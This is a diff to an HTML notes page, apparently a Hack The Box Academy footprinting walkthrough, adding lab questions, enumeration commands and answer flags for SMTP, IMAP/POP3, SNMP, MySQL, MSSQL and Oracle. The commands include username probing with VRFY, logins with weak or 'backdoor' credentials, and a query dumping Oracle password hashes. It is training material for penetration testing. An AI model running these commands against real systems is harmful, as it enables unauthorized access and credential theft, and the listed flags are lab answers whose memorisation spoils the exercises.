@@ -17047,11 +17047,158 @@ ns.inlanefreight.htb</p>
 </span></code></pre></div>
 <p>Therefore: win2k.dev.inlanefreight.htb</p>
 <h4 id="smtp">SMTP</h4>
+<p><strong>Enumerate the SMTP service and submit the banner, including its version as the answer.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>sudo nmap $ip -sC -sV -p25
+</span></code></pre></div>
+<p>Results: InFreight ESMTP v2.11</p>
+<p><strong>Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
+</span></code></pre></div>
+<p>Results: robin</p>
 <h4 id="imap-pop3">IMAP / POP3</h4>
+<p><strong>Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>sudo nmap $ip -sV -p110,143,993,995 -sC
+</span></code></pre></div>
+<p>Results: InlaneFreight Ltd</p>
+<p><strong>What is the FQDN that the IMAP and POP3 servers are assigned to?</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>sudo nmap $ip -sV -p110,143,993,995 -sC
+</span></code></pre></div>
+<p>Results: dev.inlanefreight.htb</p>
+<p><strong>Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>echo $ip inlanefreight.htb dev.inlanefreight.htb &gt;&gt; /etc/hosts
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>curl -k &#39;imaps://dev.inlanefreight.htb&#39; --user robin:robin -v
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>* Host dev.inlanefreight.htb:993 was resolved.
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>* IPv6: (none)
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>* IPv4: 10.129.42.195
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>*   Trying 10.129.42.195:993...
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>* TLSv1.3 (IN), TLS handshake, Server hello (2):
+</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>* TLSv1.3 (IN), TLS handshake, Certificate (11):
+</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>* TLSv1.3 (IN), TLS handshake, Finished (20):
+</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>* TLSv1.3 (OUT), TLS handshake, Finished (20):
+</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
+</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a>* Server certificate:
+</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a>*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
+</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a>*  start date: Nov  8 23:10:05 2021 GMT
+</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a>*  expire date: Aug 23 23:10:05 2295 GMT
+</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a>*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
+</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a>*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
+</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21" href="#__codelineno-70-21"></a>*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22" href="#__codelineno-70-22"></a>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23" href="#__codelineno-70-23"></a>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24" href="#__codelineno-70-24"></a>* old SSL session ID is stale, removing
+</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25" href="#__codelineno-70-25"></a>&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
+</span><span id="__span-70-26"><a id="__codelineno-70-26" name="__codelineno-70-26" href="#__codelineno-70-26"></a>&gt; A001 CAPABILITY
+</span><span id="__span-70-27"><a id="__codelineno-70-27" name="__codelineno-70-27" href="#__codelineno-70-27"></a>&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
+</span><span id="__span-70-28"><a id="__codelineno-70-28" name="__codelineno-70-28" href="#__codelineno-70-28"></a>&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.
+</span><span id="__span-70-29"><a id="__codelineno-70-29" name="__codelineno-70-29" href="#__codelineno-70-29"></a>&gt; A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
+</span><span id="__span-70-30"><a id="__codelineno-70-30" name="__codelineno-70-30" href="#__codelineno-70-30"></a>&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
+</span><span id="__span-70-31"><a id="__codelineno-70-31" name="__codelineno-70-31" href="#__codelineno-70-31"></a>&lt; A002 OK Logged in
+</span><span id="__span-70-32"><a id="__codelineno-70-32" name="__codelineno-70-32" href="#__codelineno-70-32"></a>&gt; A003 LIST &quot;&quot; *
+</span><span id="__span-70-33"><a id="__codelineno-70-33" name="__codelineno-70-33" href="#__codelineno-70-33"></a>&lt; * LIST (\Noselect \HasChildren) &quot;.&quot; DEV
+</span><span id="__span-70-34"><a id="__codelineno-70-34" name="__codelineno-70-34" href="#__codelineno-70-34"></a>* LIST (\Noselect \HasChildren) &quot;.&quot; DEV
+</span><span id="__span-70-35"><a id="__codelineno-70-35" name="__codelineno-70-35" href="#__codelineno-70-35"></a>&lt; * LIST (\Noselect \HasChildren) &quot;.&quot; DEV.DEPARTMENT
+</span><span id="__span-70-36"><a id="__codelineno-70-36" name="__codelineno-70-36" href="#__codelineno-70-36"></a>* LIST (\Noselect \HasChildren) &quot;.&quot; DEV.DEPARTMENT
+</span><span id="__span-70-37"><a id="__codelineno-70-37" name="__codelineno-70-37" href="#__codelineno-70-37"></a>&lt; * LIST (\HasNoChildren) &quot;.&quot; DEV.DEPARTMENT.INT
+</span><span id="__span-70-38"><a id="__codelineno-70-38" name="__codelineno-70-38" href="#__codelineno-70-38"></a>* LIST (\HasNoChildren) &quot;.&quot; DEV.DEPARTMENT.INT
+</span><span id="__span-70-39"><a id="__codelineno-70-39" name="__codelineno-70-39" href="#__codelineno-70-39"></a>&lt; * LIST (\HasNoChildren) &quot;.&quot; INBOX
+</span><span id="__span-70-40"><a id="__codelineno-70-40" name="__codelineno-70-40" href="#__codelineno-70-40"></a>* LIST (\HasNoChildren) &quot;.&quot; INBOX
+</span><span id="__span-70-41"><a id="__codelineno-70-41" name="__codelineno-70-41" href="#__codelineno-70-41"></a>&lt; A003 OK List completed (0.009 + 0.000 + 0.008 secs).
+</span><span id="__span-70-42"><a id="__codelineno-70-42" name="__codelineno-70-42" href="#__codelineno-70-42"></a>* Connection #0 to host dev.inlanefreight.htb left intact
+</span></code></pre></div>
+<p>Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}</p>
+<p><strong>What is the customized version of the POP3 server?</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>openssl s_client -connect $ip:pop3s
+</span></code></pre></div>
+<p>Results: InFreight POP3 v9.188</p>
+<p><strong>What is the admin email address?</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a># Establish a imap connection
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>openssl s_client -connect $ip:imaps
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a># Login as user robin with password robin
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>a LOGIN robin robin
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>
+</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a># List inboxes
+</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>a LIST &quot;&quot; *
+</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a>
+</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a># Select one of them
+</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a>a SELECT DEV.DEPARTMENT.INT
+</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#__codelineno-72-12"></a>
+</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13" href="#__codelineno-72-13"></a># Retrieves the messages by ID
+</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14" href="#__codelineno-72-14"></a>a FETCH 1 all
+</span></code></pre></div>
+<p>Results: devadmin@inlanefreight.htb</p>
+<p><strong>Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a># Establish a imap connection
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>openssl s_client -connect $ip:imaps
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a># Login as user robin with password robin
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>a LOGIN robin robin
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a># List inboxes
+</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>a LIST &quot;&quot; *
+</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a>
+</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a># Select one of them
+</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a>a SELECT DEV.DEPARTMENT.INT
+</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12" href="#__codelineno-73-12"></a>
+</span><span id="__span-73-13"><a id="__codelineno-73-13" name="__codelineno-73-13" href="#__codelineno-73-13"></a># Retrieve the messages by ID
+</span><span id="__span-73-14"><a id="__codelineno-73-14" name="__codelineno-73-14" href="#__codelineno-73-14"></a>a FETCH 1 all
+</span><span id="__span-73-15"><a id="__codelineno-73-15" name="__codelineno-73-15" href="#__codelineno-73-15"></a>
+</span><span id="__span-73-16"><a id="__codelineno-73-16" name="__codelineno-73-16" href="#__codelineno-73-16"></a># Retrieve the content of the message with id 1
+</span><span id="__span-73-17"><a id="__codelineno-73-17" name="__codelineno-73-17" href="#__codelineno-73-17"></a>a FETCH 1 BODY.PEEK[TEXT]
+</span></code></pre></div>
+<p>Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}</p>
 <h4 id="snmp">SNMP</h4>
+<p><strong>Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>snmpwalk -v2c -c public $ip
+</span></code></pre></div>
+<p>Results: devadmin@inlanefreight.htb</p>
+<p><strong>What is the customized version of the SNMP server?</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>snmpwalk -v2c -c public $ip
+</span></code></pre></div>
+<p>Results: InFreight SNMP v0.91</p>
+<p><strong>Enumerate the custom script that is running on the system and submit its output as the answer.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>snmpwalk -v2c -c public $ip
+</span></code></pre></div>
+<p>Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}</p>
 <h4 id="mysql">MySQL</h4>
+<p><strong>Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
+</span></code></pre></div>
+<p>Results: MySQL 8.0.27</p>
+<p><strong>During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>mysql -u robin -probin -h $ip
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>select * from customers.myTable where name LIKE &quot;Otto Lang&quot;;
+</span></code></pre></div>
+<p>Results: ultrices@google.htb</p>
 <h4 id="mssql">MSSQL</h4>
+<p><strong>Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
+</span></code></pre></div>
+<p>Results: ILF-SQL-01</p>
+<p><strong>Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>mssqlclient.py backdoor@$ip -windows-auth -p 1433
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>SELECT name FROM master.dbo.sysdatabases
+</span></code></pre></div>
+<p>Results: Employees</p>
 <h4 id="oracle-tns">Oracle TNS</h4>
+<p>Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>python3 ./odat.py all -s $ip
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a># With this we obtain the creds scott/tiger
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a># Now we connect to the database
+</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>sqlplus scott/tiger@$ip/XE as sysdba
+</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>
+</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a># Extract Password Hashes
+</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>select name, password from sys.user$;
+</span></code></pre></div>
+<p>Results: E066D214D5421CCC</p>
 <h4 id="ipmi">IPMI</h4>
 <h3 id="skills-assessment">Skills assessment</h3>
 <h4 id="footprinting-lab-easy">Footprinting Lab - Easy</h4>
@@ -17069,7 +17216,7 @@ ns.inlanefreight.htb</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-08-02T17:39:25+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-08-02</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-09-07T19:13:36+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-09-07</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
